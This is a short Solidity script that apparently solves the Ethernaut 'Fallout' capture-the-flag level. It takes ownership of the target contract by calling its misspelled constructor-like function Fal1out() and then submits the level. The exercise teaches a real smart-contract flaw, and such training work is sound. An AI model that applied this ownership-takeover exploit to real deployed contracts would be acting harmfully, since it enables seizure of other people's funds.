// SPDX-License-Identifier: MIT

pragma solidity >=0.6.0 <0.9.0;
pragma experimental ABIEncoderV2;

import "../utils/Ethernaut.sol";
import "./Fallout.sol";

contract FalloutSolver is Ethernaut {
    function run() public broadcasted {
        Fallout instance = Fallout(getLevelInstance(Levels.fallout));

        instance.Fal1out();

        submitLevelInstance(address(instance));
    }
}
